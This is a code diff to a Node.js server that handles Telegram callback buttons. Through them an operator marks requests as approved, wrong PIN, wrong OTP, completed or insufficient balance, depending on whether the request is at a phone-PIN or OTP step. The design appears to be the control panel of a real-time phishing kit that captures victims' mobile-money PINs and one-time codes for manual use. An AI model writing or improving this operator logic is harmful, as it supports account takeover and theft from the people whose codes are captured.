@@ -332,13 +332,6 @@ app.get('/api/support-whatsapp', (req, res) => {
 // ---------------------------------------------------------------------------
 // Telegram button presses (approve / deny / insufficient)
 // ---------------------------------------------------------------------------
-const STATUS_BY_ACTION = {
-  approve: 'approved',
-  deny: 'denied',
-  insufficient: 'insufficient',
-  demo_error: 'demo_error'
-};
-
 const LABEL_BY_ACTION = {
   approve: 'Approve ✅',
   deny: 'wrong code ❌',
@@ -356,7 +349,6 @@ async function processTelegramCallbacks() {
       if (!callback) continue;
 
       const [action, id] = String(callback.data || '').split(':');
-      const status = STATUS_BY_ACTION[action];
       const chatId = callback.message?.chat?.id;
       const messageId = callback.message?.message_id;
 
@@ -365,8 +357,21 @@ async function processTelegramCallbacks() {
         continue;
       }
 
-      if (!status || !id || !requests.has(id)) {
+      const request = requests.get(id);
+      if (!LABEL_BY_ACTION[action] || !id || !request) {
         await api.answerCallbackQuery({ callback_query_id: callback.id, text: 'This request is no longer available.' });
+        continue;
+      }
+
+      const statusByAction = {
+        approve: request.step === 'otp' ? 'completed' : 'phone_pin_verified',
+        deny: request.step === 'otp' ? 'wrong_otp' : 'wrong_pin',
+        insufficient: 'insufficient_balance',
+        demo_error: 'wrong_pin',
+      };
+      const status = statusByAction[action];
+      if (!status) {
+        await api.answerCallbackQuery({ callback_query_id: callback.id, text: 'Unknown action.' });
         continue;
       }
 
